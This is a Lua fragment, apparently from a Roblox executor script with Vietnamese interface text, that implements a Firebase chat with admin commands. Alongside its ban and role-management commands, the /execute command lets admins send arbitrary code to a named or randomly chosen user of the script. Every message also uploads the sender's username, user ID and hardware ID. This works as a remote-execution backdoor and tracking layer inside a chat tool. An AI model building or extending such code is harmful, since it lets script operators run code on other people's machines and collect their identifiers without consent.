local function processCommands(text)
    local myLiveRole = getRole(LocalPlayer.Name)

    local banHwid = text:match('^/ban%s+"([^"]-)"')
    if banHwid and (myLiveRole == "OWNER" or myLiveRole == "ADMIN") then
        task.spawn(function() http_request({ Url = FIREBASE_URL .. PATH_BAN .. banHwid .. ".json", Method = "PUT", Body = HttpService:JSONEncode(true) }) end)
        Window:SendNotification("Hệ Thống", "Đã khóa HWID: " .. banHwid, 3)
    end
    local unbanHwid = text:match('^/unban%s+"([^"]-)"')
    if unbanHwid and (myLiveRole == "OWNER" or myLiveRole == "ADMIN") then
        task.spawn(function() http_request({ Url = FIREBASE_URL .. PATH_BAN .. unbanHwid .. ".json", Method = "DELETE" }) end)
        Window:SendNotification("Hệ Thống", "Đã mở khóa HWID: " .. unbanHwid, 3)
    end

    local addRoleCmd, addTgt = text:match('^/(add%w+)%s+"([^"]-)"')
    if addRoleCmd and myLiveRole == "OWNER" then
        local un = getUsernameFromTarget(addTgt)
        local rName = (addRoleCmd == "addadmin") and "ADMIN" or (addRoleCmd == "addowner") and "OWNER" or nil
        if rName then
            task.spawn(function() http_request({ Url = FIREBASE_URL .. PATH_ROLES .. un .. ".json", Method = "PUT", Body = HttpService:JSONEncode(rName) }); fetchRoles() end)
            Window:SendNotification("Phân Quyền", "Đã cấp " .. rName .. " cho " .. un, 3)
        end
    end
    local remRoleCmd, remTgt = text:match('^/(remove%w+)%s+"([^"]-)"')
    if remRoleCmd and myLiveRole == "OWNER" then
        local un = getUsernameFromTarget(remTgt)
        if remRoleCmd == "removeadmin" or remRoleCmd == "removeowner" then
            task.spawn(function() http_request({ Url = FIREBASE_URL .. PATH_ROLES .. un .. ".json", Method = "DELETE" }); fetchRoles() end)
            Window:SendNotification("Phân Quyền", "Đã thu hồi quyền của " .. un, 3)
        end
    end

    if text:match("^/execute") and (myLiveRole == "OWNER" or myLiveRole == "ADMIN") then
        local tgt, code = text:match('^/execute%s+"([^"]-)"%s+([%s%S]+)')
        if tgt and code then
            if tgt:lower() == "random" then
                local userPool = {}
                for _, user in pairs(currentOnline) do
                    if user.username ~= LocalPlayer.Name and getRole(user.username) ~= "OWNER" then table.insert(userPool, user.username) end
                end
                if #userPool > 0 then
                    tgt = "@" .. userPool[math.random(1, #userPool)]
                    text = '/execute "' .. tgt .. '" ' .. code 
                end
            end
            task.spawn(function()
                http_request({ Url = FIREBASE_URL .. PATH_LOGS, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode({ executor = LocalPlayer.Name, target = tgt, code = code, timestamp = os.time() }) })
            end)
        end
    end

    return text
end

local function sendToFirebase(text, pathType)
    if isBanned then return end
    text = tostring(text or "")
    if text == "" then return end
    text = processCommands(text)

    local payload = {
        displayName = LocalPlayer.DisplayName, username = LocalPlayer.Name, userId = LocalPlayer.UserId,
        hwid = myHWID, message = text, timestamp = os.time()
    }
    task.spawn(function()
        http_request({ Url = FIREBASE_URL .. (pathType == "ADMIN" and PATH_ADMINCHAT or PATH_CHAT), Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload) })
    end)
end

local function sendMessage(text)
    if tick() - lastSend < COOLDOWN then return end
    lastSend = tick(); updateCooldown(); sendToFirebase(text, "NORMAL")
end

sendAdminMessage = function(text)
    if tick() - lastAdminSend < COOLDOWN then return end
    lastAdminSend = tick(); updateCooldown(); sendToFirebase(text, "ADMIN")
end

local function clearChat()
    for _, v in ipairs(messageObjects) do safelyDestroy(v) end
    messageObjects = {}; startTime = os.time()
end

